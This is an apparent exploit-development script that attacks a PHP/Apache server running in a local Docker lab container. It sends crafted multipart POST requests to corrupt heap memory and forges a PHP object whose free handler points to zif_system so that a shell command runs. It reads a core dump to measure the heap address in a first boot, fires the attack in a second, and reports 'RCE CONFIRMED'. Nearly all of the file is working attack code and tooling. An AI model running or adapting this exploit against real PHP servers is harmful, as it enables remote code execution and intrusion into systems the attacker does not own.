#!/usr/bin/env python3
"""oom93: two-boot measure-then-shoot.

oom92b verdict: free_obj=MARKER silent in 2 boots -> chain never reaches
free_obj -> prime suspect = VA0 guess (maps_heap + 0x1718 measured in
MARKER arms; 8-periodic arms may lay the heap differently).

Boot A (measure): tile = 8-periodic OBJ pointers + object block at
content 176..352 (free_obj=0x414141414141) + crash trigger:
marker@160 (u64 MARK) + ti@168 (refcounted, any type) -> walk hits it
-> crash; core scan of the marker's VA gives TRUE VA0 = va(mark) - 160.
  crash rdi=0x4141.. instead -> chain FIRED, VA0 was right.
Boot B (shoot): same tile, object block with free_obj=zif_system at the
measured VA0 -> /tmp/x.
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
MARK = 0x414141414141


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def maps_heap():
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    heap = None
    for ln in maps.splitlines():
        a = ln.split()
        if len(a) < 2 or not a[1].startswith("rw"):
            continue
        rng = a[0].split("-")
        if int(rng[1], 16) - int(rng[0], 16) >= 0x200000 and (len(a) < 6 or not a[5].startswith("/")):
            heap = int(rng[0], 16)
    return heap


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def tile(libphp_base, VA0, free_obj, trigger):
    """1537B value content: 8-periodic OBJ + object block at 176 + optional
    crash trigger (marker@160 + refcounted ti@168)."""
    OBJ = VA0 + 176
    v = bytearray(struct.pack("<Q", OBJ) * 192 + b"A")   # 1537
    if OBJ + 176 <= 1537:                                # always true
        B = bytearray(176)
        struct.pack_into("<II", B, 0, 1, 0x108)          # rc, ti(type8|DESTRUCTOR_CALLED)
        struct.pack_into("<I", B, 0x10, 1)               # handle
        struct.pack_into("<Q", B, 0x18, OBJ + 0x38)      # handlers -> T2
        struct.pack_into("<I", B, 0x2C, 1)               # num_args
        struct.pack_into("<Q", B, 0x38, 0)               # T2.offset
        struct.pack_into("<Q", B, 0x40, free_obj)        # free_obj
        struct.pack_into("<Q", B, 0x50, OBJ + 0x68)      # argz.value -> gs
        struct.pack_into("<I", B, 0x58, 6)               # IS_STRING
        struct.pack_into("<IIQI", B, 0x68, 1, 0x106, 0, len(CMD))
        B[0x80:0x80 + len(CMD)] = CMD
        B[0x80 + len(CMD)] = 0
        v[176:176 + 176] = B
    if trigger:
        v[160:168] = struct.pack("<Q", MARK)             # zval value
        v[168:172] = struct.pack("<I", 0x5A)             # ti: type 0x5a? NO:
        # 0x5a type -> not object; want REFCOUNTED so dec happens:
        # ti bit8 = refcounted: 0x100 | type 8 -> 0x108. value=MARK unmapped
        # -> dec at MARK -> SEGV with rdi=MARK (the probe signature).
        v[168:172] = struct.pack("<I", 0x108)
    return bytes(v)


def chooser(libphp_base, VA0, free_obj, trigger):
    def vt(i):
        return tile(libphp_base, VA0, free_obj, trigger)
    return vt


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c93_%s" % tag, 240)
    sh("docker cp /tmp/c93_%s phpbuild:/tmp/c93_%s" % (tag, tag), 240)
    return "/tmp/c93_%s" % tag


def gdb_regs(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    rdi = rip = None
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    if m:
        rdi = int(m.group(1), 16)
    m = re.search(r"rip\s+0x([0-9a-f]+)", out)
    if m:
        rip = int(m.group(1), 16)
    return rdi, rip


def core_marker_va(core_host, mark_bytes):
    data = open(core_host, "rb").read()
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    segs = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if struct.unpack_from("<I", data, o)[0] != 1:
            continue
        p_off, p_vaddr = struct.unpack_from("<QQ", data, o + 8)
        p_filesz = struct.unpack_from("<Q", data, o + 0x20)[0]
        if p_filesz:
            segs.append((p_vaddr, p_filesz, p_off))
    pos = 0
    while True:
        i = data.find(mark_bytes, pos)
        if i < 0:
            return None
        for va, sz, o in segs:
            if o <= i < o + sz:
                return va + (i - o)
        pos = i + 1


def arm_and_shoot(tag, vt):
    for i, k1 in enumerate(P.K1S[:-1]):
        post(P.build_attack(k1, 9100000 + i * 100000, value_tile=vt))
        hit, x = check_x()
        if hit:
            return ("x", x)
    post(P.build_attack(3400, 9200000, value_tile=vt))
    hit, x = check_x()
    if hit:
        return ("x", x)
    for fi in range(3):
        sb = 9210000 + fi * 4
        code, resp = post(P.build_attack(3400, sb, value_tile=vt))
        t2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
        print("  [%s] fire%d (%d): %s [%s]" % (tag, fi, sb, code, t2), flush=True)
        time.sleep(2)
        hit, x = check_x()
        if hit:
            return ("x", x)
        if code != "200":
            time.sleep(3)
            cb = fetch_core("%s%d" % (tag, fi))
            rdi, rip = gdb_regs("c93_%s%d" % (tag, fi))
            return ("crash", rdi, rip, cb)
    return ("silent",)


print("=== oom93: measure (A) then shoot (B) ===", flush=True)
boot_core_env()
base = None
for ln in sh("docker exec php_vuln cat /proc/$(docker exec php_vuln pgrep -f apache2 | head -1)/maps").splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
heap = maps_heap()
guess = heap + 0x1718 if heap else None
print("    libphp=0x%s heap=0x%x guessVA0=%s" % (base, heap or 0, hex(guess) if guess else None), flush=True)

# ---- BOOT A: measure ----
vtA = chooser(base, guess, MARK, trigger=True)
rA = arm_and_shoot("A", vtA)
VA0 = None
if rA[0] == "x":
    print("    /tmp/x already: [%s]" % rA[1], flush=True)
    print("*** RCE CONFIRMED ***", flush=True)
    sys.exit(0)
elif rA[0] == "crash":
    rdi, rip = rA[1], rA[2]
    print("    A crash rdi=0x%x rip=0x%x" % (rdi or 0, rip or 0), flush=True)
    if rdi == MARK or (rdi and (rdi & 0xFFFFFFFFFFFF) == MARK):
        VA0raw = core_marker_va(rA[3], struct.pack("<Q", rdi))
        if VA0raw:
            VA0 = VA0raw - 160
            print("    marker@0x%x -> TRUE VA0 = 0x%x" % (VA0raw, VA0), flush=True)
    elif rdi == 0 or rip == MARK:
        print("    chain FIRED (free_obj call faulted) — VA0 guess was right", flush=True)
        VA0 = guess
    else:
        print("    unexpected rdi — trying guess anyway", flush=True)
        VA0 = guess
else:
    print("    boot A silent — trying guess in boot B anyway", flush=True)
    VA0 = guess

# ---- BOOT B: shoot ----
boot_core_env()
base = None
for ln in sh("docker exec php_vuln cat /proc/$(docker exec php_vuln pgrep -f apache2 | head -1)/maps").splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
vtB = chooser(base, VA0, base + ZIF_SYSTEM, trigger=False)
rB = arm_and_shoot("B", vtB)
if rB[0] == "x":
    print("    /tmp/x: [%s]" % rB[1], flush=True)
    print("*** RCE CONFIRMED ***", flush=True)
elif rB[0] == "crash":
    print("    B crash rdi=0x%x rip=0x%x (%s)" % (rB[1] or 0, rB[2] or 0, rB[3]), flush=True)
else:
    print("    boot B silent", flush=True)

print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
